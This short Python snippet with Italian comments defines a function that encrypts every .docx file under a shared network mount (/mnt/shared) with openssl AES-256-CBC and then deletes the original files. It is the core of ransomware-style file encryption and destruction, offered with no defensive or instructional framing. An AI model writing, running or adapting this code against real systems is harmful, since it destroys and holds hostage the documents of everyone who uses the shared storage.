import os
import subprocess

def encrypt_network_files():
    # Trova e crittografa tutti i file con estensioni sensibili
    subprocess.run(["find", "/mnt/shared", "-name", "*.docx", "-exec", "openssl", "enc", "-aes-256-cbc", "-in", "{}", "-out", "{}.encrypted", ";"])
    # Elimina i file originali
    subprocess.run(["find", "/mnt/shared", "-name", "*.docx", "-exec", "rm", "{}", ";"])
